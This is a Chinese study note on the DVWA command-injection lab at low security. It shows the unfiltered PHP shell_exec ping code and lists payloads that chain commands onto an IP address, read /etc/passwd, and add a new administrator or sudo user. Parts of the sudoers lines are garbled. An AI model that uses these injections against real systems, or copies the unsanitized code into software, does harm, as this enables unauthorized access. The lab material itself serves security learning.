<center>Command Injection命令注入</center>









## Command Injection命令注入

> 命令注入











### 1. low

> 低级
>
> 代码：[url](http://192.168.0.111:8000/vulnerabilities/view_source.php?id=exec&security=low)

```shell
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

> 没有做任何过滤
>
> linux/windowns 的基本命令

````shell
# win
127.0.0.1 && ipconfig
# 创建用户提升管理员
net user UserName PassWord /add
net localgroup Administrators UserName /add


# linux 等
127.0.0.1 | ip addr
127.0.0.1 | cat /etc/passwd 

# 创建用户
sudo useradd -m username    # -m 创建家目录
# 设置密码
sudo passwd username
# 添加到 sudo 组
sudo usermod -aG sudo username    # Ubuntu/Debian
# 或
sudo usermod -aG wheel usernam# 安全编辑 sudoers 文件
sudo visudo

# 添加以下行
username ALL=(ALL:ALL) ALLe   # CentOS/RHEL/Arch Linux
# 安全编辑 sudoers 文件
sudo visudo

# 添加以下行
username ALL=(ALL:ALL) ALL
````







